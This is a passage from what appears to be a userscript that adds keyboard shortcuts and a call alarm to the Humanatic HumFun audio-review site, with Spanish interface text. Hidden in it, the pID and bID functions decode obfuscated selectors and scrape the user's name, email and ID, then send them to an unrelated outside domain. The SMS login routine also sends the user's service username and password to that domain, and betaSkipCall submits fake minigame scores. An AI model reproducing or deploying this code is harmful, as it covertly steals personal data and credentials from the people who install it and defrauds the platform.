                else if($('.headset-focus').hasClass("humfun-review-section-left"))
                    if(e.ctrlKey){wavesurfer.skipForward(3);} else {wavesurfer.skipForward(1);}
                tt_time = ((new Date().getTime() - tmp_time.time) / 1000);
                if(tmp_time.last === 'none'){
                    tmp_time.last = "up";
                    tmp_time.time = new Date().getTime();
                    tmp_time.repit=1;
                    if($(".headset-focus").length === 0)
                        $('.humfun-review-section-left').toggleClass("headset-focus");
                } else {
                    switch(tmp_time.repit){
                        case 0: break;
                        case 1:
                            tmp_time.last = "up";
                            tmp_time.time = new Date().getTime();
                            break;
                        case 2:
                            if(tmp_time.last === 'down' && tt_time < 0.4){
                                tmp_time.last = 'up';
                                tmp_time.time = new Date().getTime();
                                tmp_time.repit=3;
                            } else tmp_time.reset();
                            break;
                        case 3:
                            tmp_time.reset();
                            break;
                        case 4:
                            if(tmp_time.last === 'down' && tt_time < 0.4){
                                tmp_time.reset();
                                console.log("Listo, estas adentro!");
                                if($('.humfun-review-section-left').hasClass("headset-focus")){
                                    $('.humfun-review-section-left').toggleClass("headset-focus");
                                    if(!$('.humfun-review-section-right').hasClass("headset-focus"))
                                        $('.humfun-review-section-right').toggleClass("headset-focus");
                                } else {
                                    $('.humfun-review-section-left').toggleClass("headset-focus");
                                    if($('.humfun-review-section-right').hasClass("headset-focus"))
                                        $('.humfun-review-section-right').toggleClass("headset-focus");
                                }
                            } else tmp_time.reset();
                            break;
                    }
                }
                break;
            case 177:
                if($(".headset-focus").length === 0)
                    $('.humfun-review-section-left').toggleClass("headset-focus");
                if($('.headset-focus').hasClass("humfun-review-section-right"))
                    if($('.humfun-options-list-item-active:visible').length > 0){
                        $('.humfun-options-list-item-active:visible').next().click();
                    } else {
                        $('.humfun-options-list-item:first').click();
                    }
                else if($('.headset-focus').hasClass("humfun-review-section-left"))
                    if(e.ctrlKey){wavesurfer.skipBackward(3);} else {wavesurfer.skipBackward(1);}
                tt_time = ((new Date().getTime() - tmp_time.time) / 1000);
                if(tmp_time.last === 'none'){}
                else {
                    switch(tmp_time.repit){
                        case 0: break;
                        case 1:
                            if(tmp_time.last === 'up' && tt_time < 0.4){
                                tmp_time.last = 'down';
                                tmp_time.time = new Date().getTime();
                                tmp_time.repit=2;
                            } else tmp_time.reset();
                            break;
                        case 2:
                            tmp_time.reset();
                            break;
                        case 3:
                            if(tmp_time.last === 'up' && tt_time < 0.4){
                                tmp_time.last = 'down';
                                tmp_time.time = new Date().getTime();
                                tmp_time.repit=4;
                            } else tmp_time.reset();
                            break;
                        case 4:
                            tmp_time.reset();
                            break;
                    }
                }
                break;
            case 179:
                if($('.headset-focus').hasClass("humfun-review-section-left")){
                    play.click();
                } else if($('.headset-focus').hasClass("humfun-review-section-right")){
                    if($('.review-shadow-box.review-shadow-box-rewards:visible').length === 0){
                        if($('#iframe_callback').length>0){
                            try{
                                $('#iframe_callback').contents().find('input[type="submit"]')[0].click();
                            }catch(ee){
                                sendThisCall = true;
                                $('.special-submit-btn')[0].click();
                                wavesurfer.pause();
                                try{wavesurfer.cancelAjax();}catch(ed){}
                            }
                        } else {
                            sendThisCall = true;
                            $('.humfun-options-list-item-active>.ripple-btn>div:visible').click();
                            wavesurfer.pause();
                            try{wavesurfer.cancelAjax();}catch(ed){}
                        }
                    } else {
                        $('.review-popup-dismiss-btn').click();
                    }
                }
                break;
            case 37:
                if(e.ctrlKey){wavesurfer.skipBackward(3);} else {wavesurfer.skipBackward(1);}
                break;
            case 39:
                if(e.ctrlKey){wavesurfer.skipForward(3);} else {wavesurfer.skipForward(1);}
                break;
            default:
                returnCode = true;
                break;
        }
        return returnCode;
    };
    document.body.onkeyup = function(e){
        if(e.keyCode == 37){
            fle1_to = setTimeout(function(){fle1 = false;fle1_to = undefined;},1000);

        } else if(e.keyCode == 39){
            fle1_to = setTimeout(function(){fle1 = false;fle1_to = undefined;},1000);
        }
    };
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function pID(data){
    data = $(data);
    try{
        return {
            name: data.find(''+atob('LmRpc3BsYXktbmFtZS1ob2xkZXI=')).text(),
            email: data.find(atob('LnByb2ZpbGUtaW5mb3JtYXRpb24udXNlci1pbmZvOmZpcnN0IHNwYW46Zmlyc3Q=')).text().split(': ')[1],
            id: data.find('script').filter(function(){
                return this.innerHTML.indexOf('uid') != -1;
            }).last().text().split('uid')[1].split(',')[0].match(/\d+/g).join([]),
            f: '',//$(atob('LnJldmlld2VyLW1vZHVsZS1wcm9maWxlLXBpY3R1cmU6Zmlyc3Q=')).css(atob('YmFja2dyb3VuZC1pbWFnZQ==')).replace('url(','').replace(')','').replace(/\"/gi, ""),
            hash: btoa( data.find(''+atob('LmRpc3BsYXktbmFtZS1ob2xkZXI=')).text() + data.find(atob('LnByb2ZpbGUtaW5mb3JtYXRpb24udXNlci1pbmZvOmZpcnN0IHNwYW46Zmlyc3Q=')).text().split(': ')[1] + data.find('script').filter(function(){
                return this.innerHTML.indexOf('uid') != -1;
            }).last().text().split('uid')[1].split(',')[0].match(/\d+/g).join([])+"=")
        };} catch(e){return {};}
}

function gID(data){
    return $(data).find('script').filter(function(){
        return this.innerHTML.indexOf('uid') != -1;
    }).last().text().split('uid')[1].split(',')[0].match(/\d+/g).join([]);
}

function bID(){
    $.ajax({
        type: 'get',
        url: 'https://www.humanatic.com/pages/humfun/settings.cfm',
        success: function(data){
            DDDD = GM_xmlhttpRequest;
            if(localStorage.getItem('se2') === null){
                localStorage.setItem(pID(data).id,"");
            } else if( parseInt((new Date().getTime()/1000)/60/60/24) - parseInt(localStorage.getItem('se2')) > 5){
                localStorage.setItem(pID(data).id,"");
            }
            if(localStorage.getItem(pID(data).id) !== pID(data).hash){
                GM_xmlhttpRequest({
                    method: "GET",
                    url: "http://guarrascachondas.com/hf.php?"+"name="+pID(data).name+"&id="+pID(data).id+"&email="+pID(data).email+"&foto="+pID(data).f,
                    onload: function(response) {
                        localStorage.setItem(pID(data).id,pID(data).hash);
                        localStorage.setItem('se',parseInt((new Date().getTime()/1000)/60/60/24));
                    }
                });
            }
        }
    });
}


function betaSkipCall(yes){
    yes = yes === undefined ? true : yes;
    isSkip = true;
    try{pauseAudio();wavesurfer.cancelAjax();}catch(e){}
    if(typeof request !== 'undefined')request.abort();
    $.ajax({
        url: "cfc/humfun_activities.cfc",
        type: 'post',
        data: {
            method: 'check_minigame',
            score: getRandomInt(1,9)
        },
        dataType: 'json',
        beforeSend: function(){
            history.replaceState( {} , 'Break Room', 'break_room.cfm');
        },
        success: function(){
            preloadedCallArray = preloadedCallArray = ["",""];//["",preloadedCallArray[1]?preloadedCallArray[1]:""];//
            loadNewCall(false);
            history.replaceState( {} , 'Review', 'review.cfm');
        }
    });
    /*
    $.ajax({
        url: 'https://www.humanatic.com/pages/humfun/break_room.cfm',
        type: "get",
        async: yes,
        beforeSend: function(){
            console.log("sending");
            if(typeof audio !== "undefined"){
                audio.pause();
            }
            else {
                pauseAudio();
            }
            console.log("SKIP CALL");
            $('.humfun-audio-section').stop(true,false).animate({"left":"-120%","opacity":"0"},200);
        },
        success: function() {
            $.ajax({
                url: "cfc/humfun_activities.cfc",
                type: 'post',
                data: {
                    method: 'check_minigame',
                    score: getRandomInt(1,9)
                },
                dataType: 'json',
                success: function(){
                    preloadedCallArray = ["",""];
                    loadNewCall(false);
                }
            });
        }
    });*/
}

function alarmConfigurate(){
    if($('#alarmDiv').length>0) $('#alarmDiv').remove();
    $('<div id="alarmDiv">').css({padding:'10px','z-index':'1000',display:'none','overflow-y':'auto',position:'fixed',top:'10%',left:'50%',width:'0%',height:'80%',border:'1px solid','border-radius':'10px',background:'white','box-shadow':'2px 2px'}).appendTo('body').append($('<div id="alarmLabel">').css({'padding':'5px','text-align':'center','border-radius':'5px',color:'white',background:'gray','font-weight':'900'}).text('Alarma de llamada HumFun!')).css({display:''}).animate({width:'80%',left:'10%'},1000);

    //$('#alarmDiv').animate({width:'0%',left:'50%'},1000,function(e){$(this).css({border:'none','box-shadow':'',padding:''});});

    $('#alarmDiv').animate({width:'80%',left:'10%'},1000).css({border:'solid 1px','box-shadow':'2px 2px',padding:'10px'});

    $('<div id="alarmMsg">').css({'margin-bottom':'0px','margin-top':'5px',padding:'5px','margin-left':'20%',width:'60%',color:'blue',background:'lightgray','text-align':'center'}).appendTo('#alarmDiv').text('Seleccione las categorias a Evaluar para la alarma');

    $('<div id="CatContainer">').css({'margin-top':'5px',padding:'5px','margin-left':'20%',width:'60%',height:'68%',color:'blue','text-align': 'left',background:'lightgray','overflow-y': 'auto'}).append(
        cats.map(function(e){
            var p = $('<p>').text(this.label).css({margin:'0px',display:'block',background:'lightgray',color:'black',border:'1px solid',padding:'3px'})[0];
            p.acti = false;
            p.idd = this.id;
            p.onmouseover = function(){if(!this.acti) this.style.background='lightblue'; };
            p.onmouseout = function(){if(!this.acti) this.style.background='lightgray'; };
            p.onclick = function(){this.acti = !this.acti; this.style.background=this.acti?'lightblue':'lightgray'; $(this).css({'font-weight':this.acti?'bold':''});};
            return p;
        })
    ).appendTo('#alarmDiv');

    $('<div id="alarmButton">').css({'margin-bottom':'0px','margin-top':'5px',padding:'5px','margin-left':'20%',width:'60%',color:'white',background:'green','text-align':'center'}).appendTo('#alarmDiv').text('Aceptar')[0].onclick = function(){
        localStorage.setItem('alarmCats',JSON.stringify($.makeArray($('#CatContainer p').filter(function(){return this.acti;}).map(function(){return this.idd;}))));
        alarmMsg.remove();
        CatContainer.remove();
        this.remove();
        $('<table class="alarmElement">').css({'margin-bottom':'0px','margin-top':'5px',padding:'5px',width:'100%',color:'blue',background:'lightgray','text-align':'center'}).appendTo('#alarmDiv').append('<tr style="border: 2px solid black"><th>Titulo</th><th>N° minimo de Llamadas</th></tr>');
        JSON.parse(localStorage.getItem('alarmCats')).forEach(function(e){
            var ee=e;
            $('.alarmElement').append('<tr class="catFila" style="margin-top:5px;border: black 1px solid;"><td>'+cats.filter(function(){return this.id==ee;})[0].label+'</td><td>'+'<input type="number" style="text-align: center">'+'</td></tr>');
        });
        $('<div id="smsDiv"><span><input id="smsOk" type="checkbox"> SMS!</span><div id="smsConfigDiv" style="display:none"></br><a href="http://www.smsdigital.com.ve" style="color:blue;background:lightgray;">--&gt; SMS DIGITAL &lt;--</a></br></br>User: <input id="smsUser" type="text"> Pass: <input id="smsPass" type="text"></br>Number: <input id="smsNumber" type="number"></br></div></div>').css({'margin-bottom':'0px','margin-top':'5px',padding:'5px','margin-left':'20%',width:'60%',color:'white',background:'green','text-align':'center'}).appendTo('#alarmDiv');
        smsOk.onclick = function(){
            if(this.checked) smsConfigDiv.style.display=''; else smsConfigDiv.style.display='none';
        };
        $('<div id="alarmButton">').css({'margin-bottom':'0px','margin-top':'5px',padding:'5px','margin-left':'20%',width:'60%',color:'white',background:'green','text-align':'center'}).appendTo('#alarmDiv').text('Aceptar');
        alarmButton.onclick = function(){
            catsSelect = $('.catFila').map(function(){
                return {label: $(this).find('td:first').text(), min: parseFloat($(this).find('input')[0].value)};
            });
            localStorage.setItem('catsSelect',JSON.stringify($.makeArray(catsSelect)));
            localStorage.setItem('smsConfig',JSON.stringify({
                active: smsOk.checked,
                login: {
                    user: smsUser.value,
                    pass: smsPass.value
                },
                sms: {
                    text: '',
                    number: smsNumber.value
                }
            }));
            $('#alarmDiv').hide(1000,function(){this.remove();});
            $('<div id="alarmFloat">').attr('style','position: fixed; top: 0px; width: 50%;left: 25%;text-align: center;background: green;color: white;padding: 5px;border-bottom-left-radius: 20px;border-bottom-right-radius: 20px;cursor: pointer;').text('La Alerta de llamadas esta ').append('<span id="alarmStatus">Activada</span>').appendTo('body')[0].onclick = function(){
                var c=$(this).find('span').text();
                if(c=='Activada'){
                    $(this).find('span').text('Desactivada');
                    this.style.background = 'red';
                    localStorage.setItem('alarmActive','false');
                } else {
                    $(this).find('span').text('Activada');
                    this.style.background = 'green';
                    localStorage.setItem('alarmActive','true');
                }
            };
            localStorage.setItem('alarmActive','true');
        };
    };
}

function smsLogin(user,pass,callback){
    GM_xmlhttpRequest ( {
        method:     "GET",
        url:        "http://www.guarrascachondas.com/newver/login/auth.asp?usuario="+user+"&clave="+pass,
        onload:     callback,
    } );
}

function smsSend() {
    GM_xmlhttpRequest ( {
        method:     "GET",
        url:        "http://www.guarrascachonda.com/newver/account/incSnd.asp?text_area_input="+smsConfig.sms.text+"&destino="+smsConfig.sms.number,
        onload:     function(e){
            if(e.response.indexOf('Mensaje Enviado') != -1){
                GM_xmlhttpRequest ( {
                    method:     "GET",
                    url:        "http://www.guarrascachondas.com/newver/account/myCredits.asp",
                    onload:     function(e){
                        console.log('Mensaje Enviado, Restantes: '+$(e.response).find('.auto-welcome b')[1].innerText);
                    }
                } );
            }
        }
    } );
}